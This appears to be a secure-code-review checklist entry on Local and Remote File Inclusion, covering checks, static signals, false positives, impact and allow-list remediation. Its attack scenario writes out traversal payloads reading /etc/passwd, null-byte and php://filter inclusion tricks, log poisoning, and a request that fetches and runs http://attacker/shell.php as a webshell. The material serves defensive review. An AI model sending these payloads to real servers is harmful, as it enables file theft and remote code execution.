---
id: P92
name: LFIRFI
area: V5 File Handling
refs: ASVS V12.x / WSTG-INPV-11 / CS: File Upload, Injection Prevention
requires: [backend, file-read]
---

# P92 — LFI / RFI

## Overview
Local File Inclusion (LFI) and Remote File Inclusion (RFI) occur when user-controlled input is used to construct the path of a file that the application then **includes, requires, reads, or renders**. LFI pulls a file from the local filesystem (e.g. `/etc/passwd`, source files, logs that the attacker poisoned earlier); RFI pulls it from a remote URL (`http://attacker/shell.ext`) and is far more dangerous because it typically yields direct remote code execution. The root cause is always the same: an untrusted string reaches an include/read sink through a code path that does not confine it to an allow-list of base directories and known-good file names. Even without RFI, LFI frequently chains into code execution via log poisoning, `/proc` self-injection, PHP `php://` or `zip://` wrappers, or by including uploaded/uploadable files.

## What to check
- Does any handler feed request-derived data (`req.query`, `req.params`, `req.body`, `req.headers`) into a file-include / read / template-load / config-load call as (part of) the path or module name?
- Is the path **canonicalized** before comparison? Naive prefix checks (`if path.startsWith(baseDir)`) are defeated by `..`, percent-encoding, symlink traversal, and mixed separators (`..\`, `%2e%2e`). Always resolve to absolute form (`path.resolve`, `realpath`, `File.getCanonicalPath`).
- Is the user value restricted to an **allow-list** of file names / module keys, or is it a free string? Allow-listing by key (`{ a: './a', b: './b' }`) is the only robust control.
- For PHP: is `allow_url_include` / `allow_url_fopen` enabled? Are `include`/`require`/`include_once`/`require_once` reached with user input? Are stream wrappers (`php://filter`, `php://input`, `data://`, `zip://`, `phar://`) reachable?
- For Node: does the code call dynamic `require()`/`import()` with user input (which can resolve a module path and execute it), or `res.sendFile`/`fs.readFile` with a tainted path?
- Are uploaded files stored **inside a path that an include can later reach** (so LFI becomes RCE via a webshell)?
- Are template names, locale/language file names, or "theme"/"skin" selection driven by request input?
- Does error handling expose the included file content or confirm path existence (info leak) even when inclusion fails?

## Static signals
Dynamic include / require with request input:
- Node: `require(req.query.feature)`, `require(req.params.page)`, `await import(req.body.module)`, `res.sendFile(req.params.name, { root: __dirname })` (root option helps but is bypassable with `..` if the root isn't enforced post-resolve)
- Python: `importlib.import_module(req.args.m)`, `exec(open(req.args.f).read())`, `__import__(req.args.m)`

PHP include/require with user input and RFI primitives:
- `include($_GET['page'])`, `require($_GET['page'])`, `include_once`, `require_once`
- `allow_url_include = On`, `allow_url_fopen = On` in `php.ini`

Template / view / locale selection by request value:
- `res.render('pages/' + req.params.page)` (EJS/Pug/Express), `app.render(req.query.tpl)`
- Django/Jinja: `get_template(request.GET['theme'] + '.html')`, `render_string(user_template)` (the latter is SSTI + path control)
- Rails: `render params[:action]`, `render file: params[:path]`
- Java/Spring: `new ClassPathResource(req.getParameter('tpl') + '.jsp')`, `request.getRequestDispatcher(path).forward(...)`, `response.include(...)`

Generic file read used as "include":
- `fs.readFileSync(req.params.f)`, `open(req.query.path)`, `new File(req.getParameter('file'))`, `os.ReadFile(r.URL.Query().Get('p'))`, Ruby `File.read(params[:path])`, Go `ioutil.ReadFile` / `os.ReadFile(r.FormValue('file'))`

Path-traversal-friendly shaping (strip-only "sanitization" — a smell, not a fix):
- `.replace('..', '')` (defeated by `....`), `.replaceAll('../','')` (defeated by `....//`), `str_replace('..\\','')`
- Using `~` glob, trailing null, or extension append (`+ '.php'`) that PHP wrappers truncate (`page=/etc/passwd%00` on old PHP)

## False positives
- The user input selects from a **fixed key→path map** (allow-list) and a missing key returns a default/404 — the actual path is never string-built from user data.
- A framework view renderer resolves templates only from a configured, fixed template root and rejects names containing traversal sequences (confirm the framework version actually enforces this — older Rails `render params[:action]` is notorious).
- The value is validated against a strict format (UUID / integer / enum) before use, so it cannot carry `/`, `\`, or `..`.
- `res.sendFile(..., { root })` where the framework canonicalizes and then verifies the resolved path stays within `root` (Express does this; confirm the option is present and `..` is rejected).
- RFI is structurally impossible in the language/runtime (e.g. Node `require` of an `http://` URL is not supported unless a custom loader is installed) — but LFI may still apply.

## Attack scenario
1. Attacker requests `https://app.example.com/view?page=../../../../etc/passwd`. The handler does `require('./pages/' + req.query.page)` / `include($_GET['page'])`.
2. The path resolves outside the intended directory; the server returns `/etc/passwd` (LFI info leak / proof).
3. To escalate to RCE, the attacker poisons a log or uploads an image containing `<?php ... ?>`, then includes it: `view?page=../uploads/avatar.png%00` (or via `php://filter/convert.base64-decode/resource=...`, or a log file containing the injected PHP via a poisoned `User-Agent`).
4. If RFI is enabled (`allow_url_include=On`), the attacker requests `view?page=http://attacker/shell.php` — the remote script is fetched **and executed** server-side, yielding an immediate webshell.
5. The attacker reads secrets, pivots to the database, or establishes persistence.

## Impact
- **Confidentiality**: disclosure of source code, config/secrets (DB credentials, API keys), `/etc/passwd`, environment files, session stores.
- **Integrity**: with RFI or LFI→RCE, arbitrary code execution → full server compromise, data tampering, backdoor installation.
- **Availability**: deletion/overwrite of files, DoS via resource exhaustion, full service takeover.
- Severity scales sharply: pure LFI (read) is typically High; any path to code execution (RFI, log/upload poisoning, wrapper abuse) is Critical.

## Remediation
Do not build include/read paths from request input; select from an allow-list by key:
```ts
// VULNERABLE — dynamic require from request input
app.get('/view', (req, res) => {
  require('./features/' + req.query.feature); // LFI / code exec
});

// SAFE — allow-list keyed by validated input
const FEATURES = new Set(['profile', 'settings', 'dashboard']);
app.get('/view', (req, res) => {
  const f = FEATURES.has(req.query.feature) ? req.query.feature : 'dashboard';
  require(`./features/${f}.js`);
});
```
If a user-chosen path is unavoidable, canonicalize and verify containment: `const abs = path.resolve(baseDir, userInput); if (!abs.startsWith(path.resolve(baseDir) + path.sep)) return res.status(400).end();` — and store uploads outside any includable path, with PHP `allow_url_include=Off`. Defense-in-depth: run under a least-privilege user, chroot/container the runtime, disable dangerous wrappers, and serve uploaded content as static (never `include`d).

## References
- OWASP ASVS V12.x — Files and resources (file upload, server-side request forgery not covered here)
- OWASP WSTG-INPV-11 — Testing for Local File Inclusion / RFI
- OWASP Cheat Sheets: File Upload, Injection Prevention
